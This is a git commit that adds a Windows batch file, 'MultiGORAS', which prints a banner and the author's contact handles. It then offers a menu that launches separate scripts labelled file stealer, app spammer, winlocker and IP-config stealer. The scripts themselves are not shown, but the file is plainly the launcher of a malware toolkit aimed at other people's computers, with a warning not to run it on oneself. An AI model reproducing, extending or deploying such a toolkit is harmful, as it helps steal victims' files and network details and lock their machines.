6ac40d8c7a71cb62917b8141a4dc18c3bffb8f87
mechagoras <emin2007jafarov@gmail.com>
2024-09-12 20:07:52 +0400

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,71 @@
+@echo off
+mode 130, 30
+title MultiGORAS - by mechagoras
+chcp 65001 >nul
+cd h1
+:start
+cls
+echo.
+echo.
+echo.
+ping localhost -n 2 >nul
+echo [97m                     ███▄ ▄███▓ █    ██  ██▓  ▄▄▄█████▓ ██▓  ▄████  ▒█████   ██▀███   ▄▄▄        ██████  [0m
+ping localhost -n 1 >nul
+echo [97m                    ▓██▒▀█▀ ██▒ ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒ ██▒ ▀█▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ▒██    ▒  [0m
+ping localhost -n 1 >nul
+echo [97m                    ▓██    ▓██░▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒▒██░▄▄▄░▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   [0m
+ping localhost -n 1 >nul
+echo [93m                    ▒██    ▒██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░░▓█  ██▓▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒[0m
+ping localhost -n 1 >nul
+echo [91m                    ▒██▒   ░██▒▒▒█████▓ ░██████▒▒██▒ ░ ░██░░▒▓███▀▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒ [0m
+ping localhost -n 1 >nul
+echo [31m                    ░ ▒░   ░  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓   ░▒   ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ [0m
+ping localhost -n 1 >nul
+echo [31m                    ░  ░      ░░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░  ░   ░   ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ [0m
+ping localhost -n 1 >nul
+echo [31m                    ░      ░    ░░░ ░ ░   ░ ░   ░       ▒ ░░ ░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ░  ░  ░   [0m
+ping localhost -n 1 >nul
+echo.
+echo.
+ping localhost -n 1 >nul
+echo [97;1m DO NOT USE THIS TOOL ON YOURSELF !!! [0m
+ping localhost -n 1 >nul
+echo [97;1m READ THE INSTRUCTION MULTIPLE TIMES BEFORE USING !!! [0m
+ping localhost -n 1 >nul
+echo [97;1m -------------------------------------------------------- [0m
+ping localhost -n 1 >nul
+echo [91;1m Instagram: @emin.jaf [0m
+ping localhost -n 1 >nul
+echo [91;1m Telegram: @eminV1 [0m
+ping localhost -n 1 >nul
+echo [91;1m GitHub: mechagoras [0m
+ping localhost -n 1 >nul
+echo [97;1m -------------------------------------------------------- [0m
+echo.
+:input
+ping localhost -n 1 >nul
+echo     [93;1m#═╦═══════»[0m  [31m[FILE STEALER][0m [92m[1][0m
+ping localhost -n 1 >nul
+echo       [93;1m╚═╦══════»[0m  [31m[APP SPAMMER][0m [92m[2][0m
+ping localhost -n 1 >nul
+echo         [93;1m╚═╦═════»[0m  [31m[WINLOCKER][0m [92m[3][0m
+ping localhost -n 1 >nul
+echo           [93;1m╚═╦══════»[0m  [31m[IP-CONFIG STEALER][0m [92m[4][0m
+echo|set /p=".            [93;1m╚══>[0m"
+choice /c 1234 >nul
+if /I "%errorlevel%" EQU "1" (
+  start launch.bat
+  goto :start
+)
+if /I "%errorlevel%" EQU "2" (
+  start run.bat
+  end
+)
+if /I "%errorlevel%" EQU "3" (
+  start block.vbs
+  end
+)
+if /I "%errorlevel%" EQU "4" (
+  start dddsd.bat
+  goto :start
+)
